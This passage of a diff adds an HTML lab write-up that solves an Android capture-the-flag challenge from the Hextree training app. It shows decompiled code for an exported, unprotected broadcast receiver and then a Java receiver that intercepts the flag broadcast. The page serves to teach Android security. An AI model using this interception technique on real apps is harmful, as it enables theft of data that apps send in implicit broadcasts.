+<span id="cb8-26"><a href="#cb8-26" aria-hidden="true" tabindex="-1"></a>                flag21Activity<span class="op">.</span><span class="fu">success</span><span class="op">(</span><span class="kw">null</span><span class="op">,</span> flag21Activity<span class="op">);</span></span>
+<span id="cb8-27"><a href="#cb8-27" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb8-28"><a href="#cb8-28" aria-hidden="true" tabindex="-1"></a>        <span class="op">};</span></span>
+<span id="cb8-29"><a href="#cb8-29" aria-hidden="true" tabindex="-1"></a>        <span class="kw">this</span><span class="op">.</span><span class="fu">f</span><span class="op">.</span><span class="fu">addTag</span><span class="op">(</span>GIVE_FLAG<span class="op">);</span></span>
+<span id="cb8-30"><a href="#cb8-30" aria-hidden="true" tabindex="-1"></a>        IntentFilter intentFilter <span class="op">=</span> <span class="kw">new</span> <span class="fu">IntentFilter</span><span class="op">(</span>GIVE_FLAG<span class="op">);</span></span>
+<span id="cb8-31"><a href="#cb8-31" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>Build<span class="op">.</span><span class="fu">VERSION</span><span class="op">.</span><span class="fu">SDK_INT</span> <span class="op">&gt;=</span> <span class="dv">33</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-32"><a href="#cb8-32" aria-hidden="true" tabindex="-1"></a>            <span class="fu">registerReceiver</span><span class="op">(</span>broadcastReceiver<span class="op">,</span> intentFilter<span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
+<span id="cb8-33"><a href="#cb8-33" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb8-34"><a href="#cb8-34" aria-hidden="true" tabindex="-1"></a>            <span class="fu">registerReceiver</span><span class="op">(</span>broadcastReceiver<span class="op">,</span> intentFilter<span class="op">);</span></span>
+<span id="cb8-35"><a href="#cb8-35" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb8-36"><a href="#cb8-36" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span>GIVE_FLAG<span class="op">);</span></span>
+<span id="cb8-37"><a href="#cb8-37" aria-hidden="true" tabindex="-1"></a>        intent<span class="op">.</span><span class="fu">putExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> <span class="kw">this</span><span class="op">.</span><span class="fu">f</span><span class="op">.</span><span class="fu">appendLog</span><span class="op">(</span><span class="kw">this</span><span class="op">.</span><span class="fu">flag</span><span class="op">));</span></span>
+<span id="cb8-38"><a href="#cb8-38" aria-hidden="true" tabindex="-1"></a>        NotificationCompat<span class="op">.</span><span class="fu">Builder</span> builderAddAction <span class="op">=</span> <span class="kw">new</span> NotificationCompat<span class="op">.</span><span class="fu">Builder</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;CHANNEL_ID&quot;</span><span class="op">).</span><span class="fu">setSmallIcon</span><span class="op">(</span>R<span class="op">.</span><span class="fu">drawable</span><span class="op">.</span><span class="fu">hextree_logo</span><span class="op">).</span><span class="fu">setContentTitle</span><span class="op">(</span><span class="kw">this</span><span class="op">.</span><span class="fu">name</span><span class="op">).</span><span class="fu">setContentText</span><span class="op">(</span><span class="st">&quot;Reverse engineer classes Flag21Activity&quot;</span><span class="op">).</span><span class="fu">setPriority</span><span class="op">(</span><span class="dv">0</span><span class="op">).</span><span class="fu">setAutoCancel</span><span class="op">(</span><span class="kw">true</span><span class="op">).</span><span class="fu">addAction</span><span class="op">(</span>R<span class="op">.</span><span class="fu">drawable</span><span class="op">.</span><span class="fu">hextree_logo</span><span class="op">,</span> <span class="st">&quot;Give Flag&quot;</span><span class="op">,</span> PendingIntent<span class="op">.</span><span class="fu">getBroadcast</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="dv">0</span><span class="op">,</span> intent<span class="op">,</span> <span class="dv">201326592</span><span class="op">));</span></span>
+<span id="cb8-39"><a href="#cb8-39" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>ActivityCompat<span class="op">.</span><span class="fu">checkSelfPermission</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;android.permission.POST_NOTIFICATIONS&quot;</span><span class="op">)</span> <span class="op">!=</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-40"><a href="#cb8-40" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>Build<span class="op">.</span><span class="fu">VERSION</span><span class="op">.</span><span class="fu">SDK_INT</span> <span class="op">&gt;=</span> <span class="dv">33</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-41"><a href="#cb8-41" aria-hidden="true" tabindex="-1"></a>                ActivityCompat<span class="op">.</span><span class="fu">requestPermissions</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">[]{</span><span class="st">&quot;android.permission.POST_NOTIFICATIONS&quot;</span><span class="op">},</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb8-42"><a href="#cb8-42" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb8-43"><a href="#cb8-43" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb8-44"><a href="#cb8-44" aria-hidden="true" tabindex="-1"></a>            NotificationManagerCompat<span class="op">.</span><span class="fu">from</span><span class="op">(</span><span class="kw">this</span><span class="op">).</span><span class="fu">notify</span><span class="op">(</span><span class="dv">1</span><span class="op">,</span> builderAddAction<span class="op">.</span><span class="fu">build</span><span class="op">());</span></span>
+<span id="cb8-45"><a href="#cb8-45" aria-hidden="true" tabindex="-1"></a>            Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;Check your notifications&quot;</span><span class="op">,</span> <span class="dv">0</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb8-46"><a href="#cb8-46" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb8-47"><a href="#cb8-47" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb8-48"><a href="#cb8-48" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong>Critical detail</strong>:</p>
+<pre><code>IntentFilter intentFilter = new IntentFilter(GIVE_FLAG);
+if (Build.VERSION.SDK_INT &gt;= 33) {
+    registerReceiver(broadcastReceiver, intentFilter, 2);
+} else {
+    registerReceiver(broadcastReceiver, intentFilter);
+}</code></pre>
+<p><code>2 == Context.RECEIVER_EXPORTED</code></p>
+<p>This means:</p>
+<ul>
+<li>The receiver accepts broadcasts from other apps</li>
+<li>There is no permission requirement</li>
+<li>The broadcast is unprotected</li>
+</ul>
+<blockquote>
+<p><strong>Note</strong>: On Android 13 (API 33) and above, <code>registerReceiver()</code> requires explicitly declaring whether a dynamically registered broadcast receiver is exported when listening to unprotected broadcasts. This is done by supplying one of the following flags: <code>Context.RECEIVER_EXPORTED</code>, <code>Context.RECEIVER_NOT_EXPORTED</code>.</p>
+</blockquote>
+<p>Because the broadcast is implicit and has no permission protection any app can register a receiver for <code>io.hextree.broadcast.GIVE_FLAG</code> and intercept the flag.</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>BroadcastReceiver hijackReceiver <span class="op">=</span> <span class="kw">new</span> <span class="fu">BroadcastReceiver</span><span class="op">()</span> <span class="op">{</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="dt">void</span> <span class="fu">onReceive</span><span class="op">(</span><span class="bu">Context</span> context<span class="op">,</span> Intent intent<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> flag <span class="op">=</span> intent<span class="op">.</span><span class="fu">getStringExtra</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">);</span></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>flag <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>            Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> flag<span class="op">);</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a><span class="op">};</span></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>Build<span class="op">.</span><span class="fu">VERSION</span><span class="op">.</span><span class="fu">SDK_INT</span> <span class="op">&gt;=</span> <span class="dv">33</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>    <span class="fu">registerReceiver</span><span class="op">(</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>        hijackReceiver<span class="op">,</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>        <span class="kw">new</span> <span class="fu">IntentFilter</span><span class="op">(</span><span class="st">&quot;io.hextree.broadcast.GIVE_FLAG&quot;</span><span class="op">),</span></span>
+<span id="cb10-15"><a href="#cb10-15" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Context</span><span class="op">.</span><span class="fu">RECEIVER_EXPORTED</span></span>
+<span id="cb10-16"><a href="#cb10-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
+<span id="cb10-17"><a href="#cb10-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb10-18"><a href="#cb10-18" aria-hidden="true" tabindex="-1"></a>    <span class="fu">registerReceiver</span><span class="op">(</span></span>
+<span id="cb10-19"><a href="#cb10-19" aria-hidden="true" tabindex="-1"></a>        hijackReceiver<span class="op">,</span></span>
+<span id="cb10-20"><a href="#cb10-20" aria-hidden="true" tabindex="-1"></a>        <span class="kw">new</span> <span class="fu">IntentFilter</span><span class="op">(</span><span class="st">&quot;io.hextree.broadcast.GIVE_FLAG&quot;</span><span class="op">)</span></span>
+<span id="cb10-21"><a href="#cb10-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">);</span></span>
+<span id="cb10-22"><a href="#cb10-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
